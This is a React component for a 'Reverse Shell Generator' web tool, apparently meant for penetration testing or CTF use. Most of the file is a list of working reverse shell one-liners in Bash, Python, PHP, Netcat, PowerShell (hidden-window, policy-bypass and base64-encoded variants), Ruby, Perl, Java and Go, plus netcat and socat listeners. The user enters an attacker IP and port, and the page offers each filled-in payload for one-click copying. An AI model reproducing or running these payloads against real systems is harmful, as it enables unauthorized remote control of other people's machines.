import React, { useState } from 'react';
import { Copy, Terminal, Check } from 'lucide-react';

const SHELLS = [
  {
    cat: 'Bash',
    payloads: [
      { label: 'bash -i', cmd: 'bash -i >& /dev/tcp/{IP}/{PORT} 0>&1' },
      { label: 'bash 196', cmd: '0<&196;exec 196<>/dev/tcp/{IP}/{PORT}; sh <&196 >&196 2>&196' },
      { label: 'bash read', cmd: 'exec 5<>/dev/tcp/{IP}/{PORT};cat <&5 | while read line; do $line 2>&5 >&5; done' },
    ],
  },
  {
    cat: 'Python',
    payloads: [
      { label: 'Python3', cmd: `python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{IP}",{PORT}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'` },
      { label: 'Python2', cmd: `python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{IP}",{PORT}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'` },
    ],
  },
  {
    cat: 'PHP',
    payloads: [
      { label: 'PHP exec', cmd: `php -r '$sock=fsockopen("{IP}",{PORT});exec("/bin/sh -i <&3 >&3 2>&3");'` },
      { label: 'PHP proc_open', cmd: `php -r '$sock=fsockopen("{IP}",{PORT});$proc=proc_open("/bin/sh -i",array(0=>$sock,1=>$sock,2=>$sock),$pipes);'` },
      { label: 'PHP popen', cmd: `php -r '$sock=fsockopen("{IP}",{PORT});popen("/bin/sh -i <&3 >&3 2>&3","r");'` },
    ],
  },
  {
    cat: 'Netcat',
    payloads: [
      { label: 'nc -e', cmd: 'nc -e /bin/sh {IP} {PORT}' },
      { label: 'nc mkfifo', cmd: 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {IP} {PORT} >/tmp/f' },
      { label: 'nc OpenBSD', cmd: 'rm -f /tmp/f;mknod /tmp/f p;/bin/sh 0</tmp/f|nc {IP} {PORT} 1>/tmp/f' },
    ],
  },
  {
    cat: 'PowerShell',
    payloads: [
      { label: 'PS TCP', cmd: `powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient("{IP}",{PORT});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()` },
      { label: 'PS Base64', cmd: `powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAewBJAFAAfQAiACwAewBQAE8AUgBUAH0AKQA=` },
    ],
  },
  {
    cat: 'Ruby',
    payloads: [
      { label: 'ruby -rsocket', cmd: `ruby -rsocket -e'f=TCPSocket.open("{IP}",{PORT}).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'` },
    ],
  },
  {
    cat: 'Perl',
    payloads: [
      { label: 'perl -e', cmd: `perl -e 'use Socket;$i="{IP}";$p={PORT};socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'` },
    ],
  },
  {
    cat: 'Java',
    payloads: [
      { label: 'Runtime.exec', cmd: `r = Runtime.getRuntime()\np = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/{IP}/{PORT};cat <&5 | while read line; do \\$line 2>&5 >&5; done"] as String[])\np.waitFor()` },
    ],
  },
  {
    cat: 'Golang',
    payloads: [
      { label: 'go run', cmd: `echo 'package main;import"os/exec";import"net";func main(){c,_:=net.Dial("tcp","{IP}:{PORT}");cmd:=exec.Command("/bin/sh");cmd.Stdin=c;cmd.Stdout=c;cmd.Stderr=c;cmd.Run()}' > /tmp/t.go && go run /tmp/t.go` },
    ],
  },
  {
    cat: 'Listener',
    payloads: [
      { label: 'nc listener', cmd: 'nc -nvlp {PORT}' },
      { label: 'socat listener', cmd: 'socat TCP-LISTEN:{PORT},reuseaddr,fork EXEC:bash,pty,stderr,setsid,sigint,sane' },
      { label: 'rlwrap nc', cmd: 'rlwrap nc -nvlp {PORT}' },
    ],
  },
];

function CopyBtn({ text }: { text: string }) {
  const [copied, setCopied] = useState(false);
  const copy = () => {
    navigator.clipboard.writeText(text);
    setCopied(true);
    setTimeout(() => setCopied(false), 1500);
  };
  return (
    <button onClick={copy} className="ml-2 p-1 text-muted-foreground hover:text-primary transition-colors shrink-0">
      {copied ? <Check size={12} className="text-green-400" /> : <Copy size={12} />}
    </button>
  );
}

export default function ReverseShells() {
  const [ip, setIp] = useState('10.10.10.10');
  const [port, setPort] = useState('4444');
  const [filter, setFilter] = useState('');

  function fill(cmd: string) {
    return cmd.replace(/\{IP\}/g, ip || 'LHOST').replace(/\{PORT\}/g, port || 'LPORT');
  }

  const filtered = SHELLS.filter(s =>
    !filter || s.cat.toLowerCase().includes(filter.toLowerCase())
  );

  return (
    <div className="flex-1 overflow-y-auto p-4 md:p-8 font-mono">
      <div className="max-w-5xl mx-auto space-y-6">
        <header className="space-y-1">
          <h1 className="text-2xl font-bold flex items-center gap-2 text-primary">
            <Terminal size={22} /> Reverse Shell Generator
          </h1>
          <p className="text-muted-foreground text-xs">One-click payloads. Set your LHOST and LPORT, then copy.</p>
        </header>

        <div className="flex flex-wrap gap-3">
          <div className="flex items-center gap-2 bg-card border border-border rounded px-3 py-2">
            <span className="text-[10px] text-muted-foreground tracking-widest uppercase">LHOST</span>
            <input value={ip} onChange={e => setIp(e.target.value)}
              className="bg-transparent text-primary text-sm w-36 outline-none font-mono" placeholder="10.10.10.10" />
          </div>
          <div className="flex items-center gap-2 bg-card border border-border rounded px-3 py-2">
            <span className="text-[10px] text-muted-foreground tracking-widest uppercase">LPORT</span>
            <input value={port} onChange={e => setPort(e.target.value)}
              className="bg-transparent text-primary text-sm w-20 outline-none font-mono" placeholder="4444" />
          </div>
          <input value={filter} onChange={e => setFilter(e.target.value)}
            placeholder="Filter shells…" className="bg-card border border-border rounded px-3 py-2 text-sm text-foreground outline-none focus:border-primary/50 w-40 font-mono" />
        </div>

        <div className="space-y-4">
          {filtered.map(cat => (
            <div key={cat.cat} className="bg-card/50 border border-border rounded-lg overflow-hidden">
              <div className="px-4 py-2 border-b border-border bg-black/20 text-xs font-bold text-primary tracking-widest uppercase">
                {cat.cat}
              </div>
              <div className="divide-y divide-border">
                {cat.payloads.map(p => (
                  <div key={p.label} className="px-4 py-3 hover:bg-secondary/20 transition-colors">
                    <div className="flex items-center justify-between mb-1">
                      <span className="text-[10px] text-muted-foreground tracking-widest uppercase">{p.label}</span>
                      <CopyBtn text={fill(p.cmd)} />
                    </div>
                    <code className="text-[11px] text-primary/90 break-all whitespace-pre-wrap">{fill(p.cmd)}</code>
                  </div>
                ))}
              </div>
            </div>
          ))}
        </div>
      </div>
    </div>
  );
}
